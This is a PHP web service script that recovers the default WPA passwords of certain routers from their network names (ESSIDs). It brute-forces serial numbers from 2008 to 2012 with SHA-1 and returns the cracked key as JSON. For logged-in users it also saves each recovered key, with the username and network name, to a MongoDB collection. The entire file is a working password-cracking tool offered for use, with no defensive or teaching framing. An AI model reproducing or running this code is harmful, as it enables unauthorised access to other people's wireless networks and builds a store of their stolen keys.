<?php
session_start();
include_once 'monDB.php';

$mongo = new monDB();

$case = 0;

if (isset($_SESSION['username'])) {
    $username = $_SESSION['username'];

    if (isset($_POST['inputName']))
        $name = $_POST['inputName'];
    else
        $name = "N/A";
    $case = 1;
}

$ESSID = $_POST['inputEssid'];
$error_msg = "Oops, couldn't get password :(";
$er_arr = array("error" => $error_msg,"err"=>'1');
$error = json_encode($er_arr);
$password = "";

$hexaend = strtolower(substr($ESSID, -6));
$hexvalues = array();

for ($i = ord("A"); $i <= ord("Z"); $i++) {
    array_push($hexvalues, strtoupper((string) dechex($i)));
}
for ($i = ord("0"); $i <= ord("9"); $i++) {
    array_push($hexvalues, strtoupper((string) dechex($i)));
}

for ($year = 2008; $year <= 2012; $year++) {
    for ($week = 100; $week <= 153; $week++) {
        $snb = 'CP' . substr((string) $year, -2) . substr((string) $week, -2);
        foreach ($hexvalues as $x) {
            foreach ($hexvalues as $y) {
                foreach ($hexvalues as $z) {
                    $sn_sha = sha1($snb . $x . $y . $z);
                    if (substr($sn_sha, -6) == $hexaend) {
                        $password = strtoupper(substr($sn_sha, 0, 10));
                    }
                }
            }
        }
    }
}

//And the responses
if ($case == 0) {
    if ($password == "")
        echo $error;
    else {

        $arr = array("essid" => $ESSID, "password" => $password,"err"=>'0');
        $data = json_encode($arr);
        echo $data;
    }
} else if ($case == 1) {
    if ($password == "")
        echo $error;
    else{
    $arr = array("username" => $username, "name" => $name, "password" => $password, "essid" => $ESSID,"err"=>'0');
    $data = json_encode($arr);
    $mongo->insert('keys', $data);
    echo $data;
    }
}
?>